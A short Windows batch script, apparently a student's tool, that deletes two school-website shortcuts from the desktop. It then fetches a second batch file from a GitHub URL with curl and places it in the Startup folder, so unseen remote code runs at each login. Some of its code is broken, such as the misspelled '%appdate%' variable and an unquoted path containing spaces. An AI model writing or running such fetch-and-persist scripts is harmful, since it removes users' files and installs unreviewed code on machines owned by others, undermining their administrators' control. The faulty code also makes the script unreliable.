@echo off
title Discord: kevie#9091
cd /d %userprofile%\Desktop
del /q /f www.studi.se.url
del /q /f Landguiden.url
cd /d %public%/Desktop
del /q /f www.studi.se.url
del /q /f Landguiden.url

cd %appdate%
curl -OL https://raw.githubusercontent.com/thekevie/school-program/main/program.bat
move /-y %appdate%/program.bat %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
pause
